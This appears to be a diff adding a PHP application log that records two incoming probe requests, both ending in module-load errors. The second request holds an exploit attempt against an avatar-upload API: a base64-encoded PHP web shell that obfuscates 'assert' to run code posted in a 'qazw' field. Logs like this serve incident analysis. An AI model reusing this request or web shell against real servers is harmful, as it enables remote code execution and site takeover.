@@ -1,0 +1,12 @@
+[ 2019-03-26T18:12:03+08:00 ] 120.131.10.157 /index.php?g=Comment&m=Widget&a=fetch
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000373s ]
+ERR: 无法加载模块:Widget
+
+[ 2019-03-26T19:48:17+08:00 ] 120.92.90.154 /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpO3ByaW50KG1kNSgyMjIpKTskYT1zdHJfcmVwbGFjZSgidmJubSIsIiIsImFzdmJubXNlcnQiKTtAJGEoJF9QT1NUW3FhenddKTs/Pg==
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000027s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000367s ]
+ERR: 无法加载模块:Data2
+
